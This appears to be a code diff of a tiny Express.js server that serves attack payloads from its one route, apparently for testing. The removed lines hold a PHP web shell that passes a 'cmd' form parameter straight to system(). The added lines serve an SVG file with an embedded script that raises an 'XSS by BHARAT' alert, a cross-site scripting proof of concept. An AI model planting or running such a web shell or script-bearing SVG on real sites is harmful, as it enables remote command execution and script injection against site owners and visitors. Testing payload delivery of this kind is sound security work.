@@ -2,29 +2,12 @@ const express = require('express')
 const app = express()
 app.all('/', (req, res) => {
     console.log("Just got a request!")
-    data=`<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-    
-$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-$txt = "John Doe\n";
-fwrite($myfile, $txt);
-$txt = "Jane Doe\n";
-fwrite($myfile, $txt);
-fclose($myfile);
-
-</pre>
-</body>
-</html> `
+    data=`<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert("XSS by BHARAT");
+  </script>
+</svg> `
     res.send(data)
 })
 app.listen(process.env.PORT || 3000)
